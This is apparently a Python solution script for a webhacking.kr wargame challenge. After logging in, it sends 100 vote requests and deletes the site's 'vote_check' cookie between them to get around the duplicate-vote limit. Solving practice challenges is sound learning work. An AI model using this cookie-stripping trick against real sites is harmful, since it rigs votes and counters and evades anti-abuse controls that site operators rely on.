import requests
def login(session):
    global datas 
    datas = {}
    print(" ------------ login ----------------------")
    datas['id'] = input("webhacking.kr id: ")
    datas['pw'] = input("webhacking.kr pw: ")
    response = session.post("https://webhacking.kr/login.php?login",data=datas)
    if( "<script>location.href='/';</script>" in response.text):
        print("login success : ",datas['id'])
    else:
        print("login Fail")
        exit(0)

def main():
    session = requests.Session()
    login(session)
    for i in range(100):
        response = session.get("https://webhacking.kr/challenge/code-5/?hit="+datas['id'])
        session.cookies.__delitem__("vote_check")

if __name__=='__main__':
    main()